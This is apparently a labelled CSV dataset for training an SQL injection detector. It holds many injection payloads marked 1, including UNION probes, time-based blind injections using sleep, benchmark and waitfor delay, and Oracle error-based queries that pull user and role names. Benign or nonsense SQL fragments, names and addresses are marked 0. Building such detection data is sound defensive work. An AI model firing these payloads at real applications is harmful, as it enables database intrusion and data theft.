Query,Label
"1"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT AVG ( primitive ) FROM nobody,0
"1'+  (  select tnch where 1867  =  1867 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",1
SELECT mostly FROM met UNION SELECT present FROM above ORDER BY found,0
"SELECT * FROM cookies WHERE roof BETWEEN ""zulu"" AND    ""suit""",0
"1%' and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",1
SELECT * FROM highest WHERE answer BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT am ( s )  FROM ago FULL OUTER JOIN,0
villarrasa,0
SELECT hidden ( s FROM kill RIGHT JOIN,0
DELETE FROM hill WHERE aboard = 'opposite',0
SELECT Count ( * )  AS audience,0
31588,0
"1""   )    )    as sgln where 7573  =  7573",1
"  UPDATE effort SET noise =  'process', City =  'smaller' WHERE strong =  sets",0
corcoy augu,0
"   SELECT include, doctor+ ', ' + beneath+ ' ' + foot+ ', ' + success AS pain  FROM parent",0
"1' where 7445  =  7445 union all select null,null,null,null,null,null--",1
 UPDATE tune SET alphabet = 'fought'WHERE spent = 'seed',0
"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"-3817""  )   as vugz where 3064  =  3064 or 9323  =  9323#",1
"-7138"" union all select 2341,2341,2341,2341--",1
SELECT DISTINCT children FROM were,0
"camino san jaime 97,",0
if  (  3593  =  3779  )   select 3593 else drop function qtqy--,1
"-8312%""   )    )    union all select 4972--",1
"INSERT INTO steady  ( harder, football, needs )  VALUES  ( 'troops', 'her', 'feed' )  ",0
odelsia,0
patacki,0
s0308ga52r,0
SELECT * FROM willing,0
"  SELECT * FROM tell WHERE your IN  ( 'faster', 'on', 'are' )  ",0
abdul-sa,0
"1""   )    )    as eagr where 3366  =  3366 and elt  (  4249  =  4249,7259  )  --",1
santa eullia de ronana,0
25576,0
a3ui11d,0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_bottom_content' LIMIT 1,0
"1%'   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
select pg_sleep  (  5  ) ,1
"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'moyb'  =  'moyb",1
"1%' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",1
"calle finlandia, 46, 6-a",0
2er7n9um43a,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   # idxq",1
SELECT * FROM yourself WHERE degree = 'nest' LIMIT 3,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'atyf'  =  'atyf",1
perene,0
"1""   )    )    as ecnn where 8913  =  8913 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1
-7742  )   as tgzq where 7842  =  7842 or 2062  =  1563,1
"-5288'  )   or make_set  (  1164  =  1710,1710  )   and   (  'pkwy'  =  'pkwy",1
"-5493""   )    )    union all select 8001,8001--",1
"SELECT * FROM visit WHERE toward BETWEEN ""flame"" AND    ""sheet""",0
despault2,0
SELECT greatest ( s )  FROM felt SELECT written FROM acres,0
bordagorry,0
rob,0
"   SELECT music, noun, where FROM she WHERE rather  IS NULL",0
43774,0
SELECT * FROM sale WHERE shirt BETWEEN '1996-07-01' AND '1996-07-31',0
1'||  (  select 'etvo' from dual where 1557  =  1557,1
-3304'   )    )    order by 1--,1
SELECT surprise ( s ) FROM examine INNER JOIN,0
SELECT AVG ( due ) FROM guide SELECT SUM ( police ) ,0
"1""  )   where 6821  =  6821 waitfor delay '0:0:5'--",1
SELECT lost ( s )  FROM structure FULL OUTER JOIN,0
nacer,0
"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""fvrq""  =  ""fvrq",1
66718383y,0
-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',1
h2lmi0to,0
c/ agachadilla 81,0
"1   )    )    as aeat where 1007  =  1007 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
select pg_sleep  (  5  )  -- ojzt,1
1 where 6173  =  6173,1
""" or sleep  (  __TIME__  )    =  """,1
SELECT brick,0
datario,0
"calle ladera, 147 10-e",0
SELECT * FROM support WHERE race = 'needle'  OR important = 'produce',0
"1""  )   where 6478  =  6478 union all select null,null,null,null,null,null#",1
"1   )    )    as queb where 2449  =  2449 union all select null,null#",1
SELECT region ( s )  FROM coffee UNION ALL,0
"1""   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""kxws"" like ""kxws",1
"   SELECT stone,dark,sleep,enjoy,though     (  (  quietly JOIN raise ON way.if =  education.strip )   INNER JOIN weighON Orders.stop =  egg.pairID ) ",0
SELECT AVG ( equally ) FROM night,0
SELECT TOP 3 * FROM practice,0
1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1
matacandelas,0
nolberto,0
SELECT * FROM compound FETCH FIRST 3 ROWS ONLY,0
SELECT TOP 3 * FROM near WHERE number = 'correctly',0
"1  )   where 9645  =  9645 union all select null,null,null--",1
SELECT AVG ( fresh ) FROM milk SELECT SUM ( voice ) ,0
lauraine,0
 (  s,1
SELECT Count ( * )  AS drive,0
SELECT TOP 50 PERCENT * FROM officer SELECT * FROM single FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM move,0
"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,1
9834,0
"1 where 7412  =  7412 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT TOP 50 PERCENT * FROM deal SELECT * FROM himself FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM feed,0
lanfranchi@getgold.tl,0
viver,0
"select * from generate_series  (  6730,6730,case when   (  6730  =  9431  )   then 1 else 0 end  )   limit 1--",1
1' where 9003  =  9003 waitfor delay '0:0:5'--,1
7542,0
"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'obeh'  =  'obeh",1
 or pg_sleep  (  __TIME__  )  --,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""soyg""  =  ""soyg",1
valcarcel,0
SELECT COUNT ( DISTINCT wash )  FROM steep,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",1
5.10E+15,0
sagunto/sagunt,0
FROM  ( SELECT DISTINCT bare FROM although ) ,0
1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'wuux'  =  'wuux,1
"1%'   )    )    and make_set  (  6527  =  9529,9529  )   and    (    (   '%'  =  '",1
"1'  )   as wtfo where 5666  =  5666 union all select null,null,null,null--",1
4.23384E+15,0
"    SELECT column1, column2,...     FROM existing_table_name     WHERE ....; CREATE TABLE TestTable AS ",0
"  SELECT TIME ( ""19:30:10"" ) ;",0
SELECT AVG ( except ) FROM slight SELECT SUM ( fog ) ,0
SELECT ProductName FROM Products WHERE ProductID  =  ANY,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",1
" select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",1
SELECT COUNT ( plates ) FROM needed,0
SELECT COUNT ( keep )  FROM musical,0
"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",1
-4055'   )    )    as yoez where 3816  =  3816 or   (  8459  =  8459  )  *4906--,1
"   SELECT quite, window, watchFROM edge WHERE onto  IS NOT NULL",0
"   SELECT Employees.LastName, COUNT ( Orders.OrderID )  AS NumberOfOrdersFROM Orders  INNER JOIN Employees ON Orders.EmployeeID  =  Employees.EmployeeID",0
SELECT * FROM dog WHERE gulf BETWEEN '1996-07-01' AND '1996-07-31',0
"1   )    )    union all select null,null,null,null,null,null,null,null,null,null--",1
1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',1
"1""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
lim@marketingmunicipal.bf,0
"1"" waitfor delay '0:0:5'",1
4ntra6a,0
tiberio,0
SELECT TOP 3 * FROM tropical SELECT * FROM feel 3SELECT * FROM chair,0
SELECT thrown ( s ) FROM motion INNER JOIN,0
tabakov@wdsl.ly,0
-2983'  )   or 8571  =  8571--,1
"1""  )   as qirf where 6200  =  6200   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1
"-9371'  )   union all select 5900,5900,5900#",1
" SELECT RPAD ( CustomerName, 30, ""ABC"" )  AS RightPadCustomerName FROM Customers; ",0
SELECT * FROM rest,0
"  UPDATE collect SET pocket =  'particular', City =  'rest' WHERE struck =  limited",0
5.72741E+15,0
SELECT * FROM official 3,0
SELECT * FROM rubber WHERE twenty = 'wheat',0
" select * from users where id  =  1. union select null,version  (    )   -- 1",1
"1""   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
remo,0
SELECT * FROM claws  WHERE boy NOT LIKE '[thus]%',0
-5982' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'ikuh'  =  'ikuh,1
SELECT * FROM strike WHERE fighting = 'accurate'  AND City = 'exact',0
"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1
SELECT * FROM eaten WHERE left = 'construction' LIMIT 3,0
"  UPDATE would SET zoo =  'family', City =  'death' WHERE magnet =  throat",0
"1""  )   where 2656  =  2656 or sleep  (  5  )  --",1
"-8868""  )   where 5681  =  5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681--",1
SELECT * FROM species ORDER BY love,0
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'oofd'  =  'oofd,1
2.78171E+15,0
SELECT * FROM hello WHERE first NOT BETWEEN 'sleep' AND 'breathing',0
"  SELECT journeyID AS ID, circle AS tall FROM clock",0
qu.8ncen3rio,0
"1'  )   union all select null,null,null#",1
"1'||  (  select 'uqbj' from dual where 6736  =  6736 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
1'||  (  select 'lvso' where 5675  =  5675,1
"-9928""   )    )    union all select 7511,7511,7511,7511,7511,7511,7511,7511#",1
6o40o41,0
"1'+  (  select jidy where 2989  =  2989 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
SELECT AVG ( game ) FROM stage SELECT SUM ( subject ) ,0
tubalcan,0
"1%""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""%""  =  """,1
DELETE FROM hit,0
SELECT * FROM lift WHERE beginning = 'mission'  AND City = 'dig',0
imperial 143,0
"-5591%""   )    )    order by 1--",1
1'+  (  select 'vidl' where 9445  =  9445 and 5498  =  5777#,1
"-7107""   )    )     )   order by 1#",1
"1%""   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  ""%""  =  """,1
SELECT TOP 3 * FROM doubt SELECT * FROM now 3SELECT * FROM chamber,0
"-8686"" where 4532  =  4532 or elt  (  3301  =  9065,9065  )  --",1
5.88977E+15,0
"1' in boolean mode  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'igqm'  =  'igqm",1
SELECT * FROM gulf WHERE salmon NOT BETWEEN 'town' AND 'curve',0
"1""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""quni""  =  ""quni",1
cenicientos,0
"-4798""   )    )     )   union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#",1
"-5032' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
"1"" where 6179  =  6179",1
"1%'   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
alide,0
vizcaya,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",1
 UNION SELECT,1
enardecedora,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,1
diezma,0
SELECT COUNT ( characteristic ) FROM shorter,0
SELECT jump ( s )  FROM passage LEFT JOIN,0
49126,0
SELECT STATEMENT  ) ;,0
5.82525E+15,0
SELECT * FROM blind WHERE order NOT LIKE 'century%',0
SELECT TOP 3 * FROM gain,0
SELECT file FROM wp_sm_sync,0
"  SELECT lengthID AS ID, girl AS fastened FROM imagine",0
SELECT COUNT ( softID ) FROM top,0
SELECT * FROM Customers  WHERE City LIKE '[a-c]%';,0
SELECT DISTINCT smell FROM equator,0
"1%"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,1
if  (  1665  =  3845  )   select 1665 else drop function nzod--,1
SELECT darkness ( s )  FROM bottom,0
SELECT * FROM  ( SELECT announced FROM knew ) ,0
SELECT AVG ( Price ) FROM red,0
"1  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  5132  =  5132",1
SELECT * FROM open FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM brass,0
SELECT * FROM food WHERE lips NOT BETWEEN 'ordinary' AND 'mix',0
digenova,0
9824,0
SELECT * FROM machinery 3 SELECT * FROM southern,0
37246742j,0
ayoroa,0
1  )   and 8417  =  5276#,1
"1""  )   where 3679  =  3679",1
boothe,0
SELECT COUNT ( fifth )  FROM at,0
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
"calle poligono quintos, 37,",0
SELECT slow FROM result UNION SELECT similar FROM function ORDER BY swing,0
lladurs,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  '%'  =  '",1
SELECT MIN ( making )  AS minerals FROM plural,0
"INSERT INTO paper  ( plant, potatoes, powder )  VALUES  ( 'willing', 'stood', 'ice' )  ",0
SELECT * FROM level WHERE sport BETWEEN satellites09/01/1996modern AND fill15/31/1996opportunity,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c87dd67714' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28638 )  ORDER BY meta_id ASC",0
5.24225E+13,0
SELECT learn ( s )  FROM decide FULL OUTER JOIN,0
SELECT * FROM load WHERE very = 'secret',0
"1  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
-8007'   )    )    as bgpp where 9555  =  9555 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
"-5230""  )   or elt  (  1032  =  1032,3623  )   and   (  ""aivb"" like ""aivb",1
"1"" where 1831  =  1831 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
16727733v,0
"-7295""  )   or 9323  =  9323#",1
emesh,0
"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",1
?s,1
select   (  case when   (  1946  =  1302  )   then 1946 else 1/  (  select 0  )   end  )  --,1
silvita,0
35936056m,0
"1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT potatoes ( s )  FROM exact FULL OUTER JOIN,0
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,1
